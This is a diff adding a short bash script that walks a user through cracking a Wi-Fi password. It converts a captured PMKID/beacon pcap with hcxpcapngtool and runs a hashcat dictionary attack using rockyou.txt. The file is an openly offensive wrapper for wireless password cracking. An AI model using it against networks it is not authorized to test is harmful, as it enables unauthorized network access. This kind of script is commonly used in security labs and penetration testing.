@@ -1,0 +1,66 @@
+#!/bin/bash
+
+#preamble
+clear
+echo "This will take a pcap file with a known PKMID and beacon frame"
+echo "and turn it into a hash using hcxpcapngtool that hashcat can read"
+echo "in order to run a dictionary attack to crack the password using rockyou.txt"
+echo "(that means you need to run collection and capture aforementioned frames)"
+echo "            "
+echo "let's get started"
+sleep 4
+clear
+
+#setting up hcxpcapngtool
+
+echo "hcxpcapngtool configuration settings. These are going into your home directory."
+echo "       "
+read -p "what do you want to name the hash file? : " hashname
+read -e -p  "where is your file? (absolute file path): " user_filepath 
+
+#this expands the tilde being used to whatever the user's local system is.
+user_filepath="${user_filepath/#\~/$HOME}"
+
+#This resolves the full filepath to ensure the path exists, resolves '~',
+#symlinks, etc
+
+user_filepath=$(realpath -e "$user_filepath" 2>/dev/null)
+
+if [ -z "$user_filepath" ]; then
+	echo "Sorry bud... Couldn't find it."
+	exit 1
+fi
+
+echo "Now we're in business!"
+echo "       "
+
+sudo hcxpcapngtool -o $hashname.22000 $user_filepath
+
+echo "		"
+read -n 1 -s -r -p "looking good? (Press Enter to continue)"
+clear
+
+#running hashcat from that new hash file
+echo "This is going to run the hashcat dictionary attack from the parameters you gave me in the previous screen."
+echo "		"
+read -e -p "Where is your rockyou.txt? (absolute file path): " rockyou_filepath
+
+#Once again, expanding the tilde 
+
+rockyou_filepath="${rockyou_filepath/#\~/$HOME}"
+
+#This resolves the full filepath to ensure the path exists, resolves '~',
+#symlinks, etc
+
+rockyou_filepath=$(realpath -e "$rockyou_filepath" 2>/dev/null)
+
+if [ -z "$rockyou_filepath" ]; then
+        echo "Sorry bud... Couldn't find it."
+        exit 1
+fi
+
+echo "Now we're in business!"
+echo "       "
+
+hashcat -a 0 -m 22000 $hashname.22000 $rockyou_filepath
+
